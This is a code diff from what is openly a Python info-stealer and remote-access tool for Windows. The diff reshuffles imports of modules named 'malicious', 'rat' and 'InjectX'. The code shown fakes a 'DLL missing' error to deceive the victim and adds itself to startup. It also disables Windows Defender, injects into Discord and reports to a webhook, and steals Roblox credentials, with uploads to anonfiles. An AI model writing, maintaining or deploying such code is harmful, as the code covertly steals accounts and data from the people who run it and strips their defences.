@@ -1,4 +1,18 @@
-from requirements_installation import requirementsinstallation
+import requirements_installation
+import _webhook
+import discordc
+import informations
+import malicious
+import rat
+import InjectX
+import startup
+from config import Config
+from _roblox import RobloxX
+from anonFile import uploadToAnonfiles
+from disable_defender import disabledefender
+ii = informations.Info()
+_webh = _webhook.WebhookX()
+cc = Config()
 
 try:
     import getpass
@@ -28,21 +42,6 @@ try:
 except Exception:
     requirementsinstallation()
 
-import _webhook
-import discordc
-import informations
-import malicious
-import rat
-import injection
-from config import Config
-from _roblox import RobloxX
-from anonFile import uploadToAnonfiles
-from startup import StartUp
-from disable_defender import disabledefender
-ii = informations.Info()
-_webh = _webhook.WebhookX()
-cc = Config()
-
 
 if platform.system() != "Windows":
     sys.exit()
@@ -51,7 +50,7 @@ if cc.get_fake_error() == True:
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
 
 if cc.get_start_up() == True:
-    StartUp()
+    startup.StartUp()
     
 if cc.get_disable_windows_defender() == True:
     disabledefender()
@@ -861,7 +860,7 @@ if cc.get_malicious_stealing() == True:
     send_malicious()
 
 if cc.get_injection() == True:
-    injection.InjectionX(webhook)
+    InjectX.InjectionX(webhook)
 
 if cc.get_roblox_stealing() == True:
     RobloxX().run()
